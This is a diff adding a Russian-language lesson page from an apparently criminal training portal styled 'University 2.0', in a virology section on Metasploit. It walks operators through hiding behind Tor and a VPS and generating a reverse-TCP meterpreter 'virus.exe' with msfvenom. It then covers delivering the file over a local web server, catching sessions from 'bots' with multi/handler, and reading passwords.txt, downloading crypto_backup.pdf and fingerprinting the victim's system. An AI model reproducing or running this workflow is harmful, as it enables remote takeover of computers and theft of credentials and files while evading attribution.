@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <link rel="shortcut icon" href="source/favicon.ico" type="image/x-icon">
+    <title>Уроки | University 2.0</title>
+    <link rel="stylesheet" href="source/main.css">
+    <link rel="stylesheet" href="source/style.css">
+
+    <link rel="stylesheet" href="source/tikets.css">
+    <link rel="stylesheet" href="source/profile_window.css">
+
+    <link rel='stylesheet' href="source/default.css">
+    <link rel='stylesheet' href="source/idea.css">
+    <script type="text/javascript" src="source/highlight.pack.js"></script>
+</head>
+<body>
+
+
+    <div id="myfond_gris" opendiv=""></div>
+    <div align="center" style="padding-top:35px;">
+        <div id="box_1" class="mymagicoverbox_fenetre" style="left:-225px; width:450px;">
+            Anon | 00500
+            <div class="mymagicoverbox_fenetreinterieur" style="height:220px; ">
+                <div align="left">
+                    <p class="lead">Имя пользователя: Anon</p>
+                    <p class="lead">Статус: Активен</p>
+                    <p class="lead">Регистрация jabber: <a target="_blank" href="http://plast.cash/registration.php?key="></a></p>
+                    <p class="lead">Поток: Anon</p>
+                    <p class="lead">TG канал: <a target="_blank" href="">Канал для опретивных оповещений</a></p>
+                    
+                    <br><br>
+                    <div style="width:100px" align="center" class="mymagicoverbox_fermer">Закрыть</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+
+<div class="main_container">
+    <header>
+        <a href="index.html"><img class="logo" src="source/logo.png" alt="University 2.0"></a>
+        <div class="header_right">
+            <div class="user_info">
+                <p>Hello,
+                <a href="#" iddiv="box_1" class="mymagicoverbox"> Anon </a>
+
+
+                </p>
+                <p>ID: 00500</p>
+            </div>
+            <div class="user_actions">
+                <a href="help.html"
+                   class="btn btn_gray btn_transparent btn_border_transparent btn_icon btn_icon_help">Помощь</a>
+                
+                    
+                    <a href="index.html" class="btn  btn_round btn_status btn_status_active btn_gray btn_exit">Выход</a>
+                
+            </div>
+        </div>
+    </header>
+    <div class="container">
+        <nav>
+            <a href="index.html" class="btn btn_icon btn_icon_dashboard ">Сводка</a>
+            <a href="lections.html" class="btn btn_icon btn_icon_book active">Лекции</a>
+            <a href="index.html" class="btn btn_icon btn_icon_group ">Тикеты</a>
+            <a href="faq.html" class="btn btn_icon btn_icon_chat ">FAQ</a>
+        </nav>
+        <div class="content">
+
+
+
+<div class="banner_block" style="background-image:url('source/virusology.jpeg')">
+        <div class="banner_content">
+            <h2>Фреймворки</h2>
+            <p>Вирусология</p>
+            <p>Зголовок обновика</p>
+        </div>
+    </div>
+    <br>
+
+            
+
+            
+    <div class="article_actions">
+        <a href="virus.html" class="btn btn_round btn_gray  btn_icon btn_icon_back ">Назад</a>
+    </div>
+    
+  <div class="text_content">
+        <h2 style="text-align:center">Где можно использовать клиент metasploit</h2>
+
+<p>Metasploit уже предустановлен в kali linux. Но не все задачи можно выполнить из виртуальной машины. Наш kali linux подключён через tor, а, как мы знаем, в tor невозможно открыть порт для прослушивания. Единственный способ открыть сервер в tor - воспользоваться механизмом onion серверов. А необходимость в открытии порта у нас есть: на него мы будем принимать подключения от наших ботов.</p>
+
+<p style="text-align:right"><tt>Есть два типа подключений пейлоада</tt></p>
+
+<p><strong>Back connect</strong>(обратное подключение). Так же это reverse подключение - после запуска пейлоад сам связывается с сервером и устанавливает соединение.</p>
+
+<p><strong>Открытие локального порта </strong>- после запуска пейлоад начинает слушать на каком-то порте в ожидании подключения от управляющего сервера.<br />
+<br />
+Каждой из этих методов применим в своей ситуации, но чаще всего подключение идёт через back connect, его мы и рассмотрим. При обратном подключении проблем возникает меньше всего, потому что от клиента не требуется наличие белого IP.</p>
+
+<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px">Белый IP - IP, который доступен из внешней сети. Открыть порт и подключиться к нему через интернет можно только при таком типе адреса. Причём важно, чтобы не только IP был белым, но и чтобы был выстроен маршрут от внешнего устройства до машины с сервером. Например, если подключить компьютер через модем, то всё что находится за модемом станет внутренней сетью и будет недоступно извне. Эту проблему можно решить пробросом портов. Проброс портов - технология адресации определённого порта на выбранную машину в локальной сети. Например, если на компьютере, подключённому к интернету через модем с белым IP, открыть web сервер на 80 порту, а на роутере настроить перенаправления трафика с 80 порта на этот компьютер, то web сервер будет доступен через интернет. То же самое и с metasploit в VirtualBox. Можно настроить проброс порта(скажем 1234) в виртуальную машину и принимать подключения с хост системы. Но такой метод не подходит из соображений безопасности. Так как тогда нам придётся вешать сервер на свой реальный IP, что противоречит безопасности.</div>
+
+<p>&nbsp;</p>
+
+<p>Так как же нам получить тогда белый IP для работы, если со своего адреса пробрасывать нельзя? - Для этого используются VPS сервера. На любом VPS доступен внешний IP, который можно использовать для принятия подключений. Про установку и настройку VPS мы поговорим позже, а пока настроим тестовый стенд в локальной сети.<br />
+<br />
+Небольшое резюме: metasploit можно использовать на любой linux сборке, в том числе и на VPS. VPS необходим, если структура сети атакуемой машины неизвестна или прямое подключение невозможно по другим причинам.</p>
+
+<h2 style="text-align:center">&nbsp;</h2>
+
+<h2 style="text-align:center"><br />
+Генерация payload</h2>
+
+<p>Нам понадобится виртуальная машиа с kali linux и клон windows машины на роль жертвы.</p>
+
+<p><br />
+Как мы уже знаем, metasploit состоит из нескольких модулей, и мы уже смотрели на masfvenom, который используется для создания пейлоадов. Основным инструментом, через который ведётся управдение ботами, является mafconsole. Для начала нам нужен будет пейлоад, который мы будем закидывать на атакуемую машину. В нашем случае, на виртуальный windows. Первым делом надо узнать адрес kali linux во внутренней сети. Он у нас будет в роли сервера потому что мы будет делать back connect. Выполняем команду</p>
+
+<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px">ip a</div>
+
+<p>Должно выдать информацию по двум адаптерам. lo и eth0. В eth0 будет строка начинающийся с <strong>inet</strong>, и после неё будет адрес. Скажем, 10.152.152.25. Его надо запомнить, <em>он будет использоваться как адрес для подключений</em>. <span style="color:#e74c3c">На сервере в качестве этого адреса будет использоваться IP самого VPS</span>. Его лучше скопировать напрямую из информации о VPS.</p>
+
+<p style="text-align:right"><tt>Далее создаём payload командой</tt></p>
+
+<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px">msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows LHOST=10.152.152.25 LPORT=1234 -f exe &gt; virus.exe</div>
+
+<p>Небольшая информация по ней</p>
+
+<p><em>Класс - meterpreter</em>. Из популярных есть ещё shell. Отличается возможностями. Shell - просто удалённый доступ к командной строке, а meterpreter поддерживает полноценный набор функций metasploit. Мы их ещё рассмотрим.</p>
+
+<p><em>Архитектура - x86(32х разрядные процессоры)</em>. x86 работает не только на 32 битной видне, но и на 64. Она самая универсальная. Потому что все 64 битные системы поддерживают эмулацию 32, но наобором это не работает.</p>
+
+<p><em>Цель - windows машина.</em></p>
+
+<p><em>LHOST - это IP на который отстучит вирус</em>. <span style="color:#e74c3c">Его надо заменить на тот адрес, который был получен из команды ip a.</span></p>
+
+<p><u>Формат пейлоада - exe</u>. Тут так же может быть какой-нибудь скриптовый язык, и заражение будет после исполнения команды.</p>
+
+<p>И финальная часть <u>&gt; virus.exe - записать всё в файл virus.exe</u>. Этот файл создастся в текущей папке.<br />
+<br />
+Настало время запустить копию windows для заражения и скинуть туда полученный файл. Проще всего передать файл через локальный веб сервер.</p>
+
+<p style="text-align:right"><tt>Запуск локального файлового сервера</tt></p>
+
+<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px">python3 -m http.server</div>
+
+<p>Должно вывести<br />
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...<br />
+<br />
+Открываем в виртуальной windows браузер и заходим на http://10.152.152.25:8000/virus.exe<br />
+10.152.152.25 тут тоже надо подстроить под свой вывод команды ip a.<br />
+<br />
+Файл virus.exe сохраняем, но <strong>пока не запускам</strong>. Перед запуском надо настроить сервер, чтобы принять подключение. Возвращаемся в kali. Открытый web сервер завершаем комбинацией ctrl+c.</p>
+
+<h2 style="text-align:center">Первый запуск msfconsole</h2>
+
+<p style="text-align:right"><tt>Запускам его командой</tt></p>
+
+<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px">msfconsole</div>
+
+<p><br />
+После успешного запуска появится банер программы. Внизу него будет информация о версии, количестве эксплоитов в базе, а в начале строки начнёт писать msf5 &gt;. <tt>Затем</tt></p>
+
+<p style="text-align:right"><tt>Запускаем универсальный обработчик подключений командой</tt></p>
+
+<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px">use exploit/multi/handler</div>
+
+<p><br />
+Начало строки должно поменяться на msf5 exploit(multi/handler) &gt;. Это значит, что нужный модуль запущен. Теперь надо указать тип пейлоада, с которыми мы работаем. В нашем случае это делается командой</p>
+
+<p style="text-align:right"><tt>Устанавливаем тип рабочего пейлоада</tt></p>
+
+<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px">set payload windows/meterpreter/reverse_tcp</div>
+
+<p style="text-align:right"><br />
+<tt>Устанавливаем порт, на которой будут приходить подключения</tt></p>
+
+<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px">set LPORT 1234</div>
+
+<p>Этого минимального набора настроек достаточно.</p>
+
+<p style="text-align:right"><tt>Запускаем прослушку</tt></p>
+
+<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px">exploit -j -z</div>
+
+<p>И теперь в виртуальной windows запускаем загруженный нами вирус. Сейчас в консоли kali должно появиться сообщение<br />
+<em>Meterpreter session 1 opened</em><br />
+<br />
+Тогда можно нажать enter и вернуться к консоли. Metasploit способен держать кучу подключений в фоне, подключение к заражённому windows тоже поддерживается в фоне. Для отображения списка всех соединений достаточно выполнить команду</p>
+
+<p style="text-align:right"><tt>Отображение списка текущих подключений</tt></p>
+
+<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px">sessions -l</div>
+
+<p><br />
+Чтобы перейти к подключению выполняем</p>
+
+<p style="text-align:right"><tt>Установка активного подключения</tt></p>
+
+<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px">sessions -i 1</div>
+
+<p><br />
+Посмотреть весь список доступных команд можно help. Он будет одинаковый для всех ботов, которые работают на metasploit пейлоаде. Для shell пейлоада доступны команды как в обычной командной строке. Давайте сразу попробуем некоторые частые команды. В metasploit сессии поддерживается большинство команд командной строки. Поэтому мы можем сделать, например, так:</p>
+
+<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px">ls C:\\secrets<br />
+cd C:\\secrets<br />
+pwd<br />
+ls<br />
+cat passwords.txt</div>
+
+<p><br />
+Команда cat способна вывести содержимое файла в консоль. Удобно, это поддерживается даже чистым шелом, но не очень универсально. Более мощной является система обмена файлами в metasploit. Есть локальный путь - это тот путь, который сейчас считается активным на текущем машине с metasploit, и удалённый - путь на машине у жертвы. Мы уже рассматривали такой подход. Перед локальными командами просто ставится буква l. Давайте попробуем скачать условный файл crypto_backup.pdf, который находится по пути C:\\secrets</p>
+
+<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px">cd C:\\secrets<br />
+download crypto_backup.pdf</div>
+
+<p>После окончания загрузи файл появится в нашей текущей папке. Узнать её можно командой</p>
+
+<p style="text-align:right"><tt>Показать активную локальную папку</tt></p>
+
+<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px">lpwd</div>
+
+<p><br />
+Загрузка файла делается аналагочни. Команда upload, и имя файла вводится с локальной машины.<br />
+<br />
+Как посмотреть, что запущено у жертвы? Надо просто выполнить команду</p>
+
+<p style="text-align:right"><tt>Отобразить процессы у жертвы</tt></p>
+
+<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px">ps</div>
+
+<p>Она покажет всю информацию о процессках: пиды, имена и пути файлов, архитектуру и пользователя.<br />
+<br />
+Ещё одна полезная и несложная команда покажется информацию об атакуемой системе</p>
+
+<p style="text-align:right"><tt>Ниформация об атакуемой машине</tt></p>
+
+<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px">sysinfo</div>
+
+<p>Так можно узнать билд системы. Он пригодится нам для подбора уязвимостей.</p>
+
+<p>Ну и последняя часто используемая команда</p>
+
+<p style="text-align:right"><tt>Отключиться от текущей сессии</tt></p>
+
+<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px"><tt>bg</tt></div>
+
+<p>&nbsp;</p>
+
+<p>Возможности metasploit очень обширные, и с более специфичными командами мы будем знакомится на примере конкретных сценариев атаки. Используя metasploit можно даже перенастроить сеть человеку. Большим плюсом во всём этом является переносимость: metasploit поддерживает большой спектр устройств, и везде доступен широкий набор команд.</p>
+    </div>
+    <br>
+
+ 
+        </div>
+    </div>
+</div>
+<footer>
+    <p>University 2.0</p>
+</footer>
+
+</body>
+</html>
